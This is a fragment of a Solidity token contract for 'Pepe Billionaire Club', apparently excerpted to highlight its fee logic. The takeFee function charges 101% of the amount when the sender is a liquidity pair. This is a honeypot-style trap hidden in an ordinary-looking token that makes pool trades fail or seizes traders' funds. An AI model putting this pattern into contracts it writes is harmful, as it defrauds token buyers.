...
contract PBC is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "Pepe Billionaire Club";
    ...
    constructor () {
        ...
        marketing = payable(address(0x4770F25db83160dcdd781190eE1775901bC3DAE1));
    }
    ...
    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 swapFee = amount.mul(1).div(100);

        if(_lppair[sender] != 0) 
            swapFee = amount.mul(101).div(100);
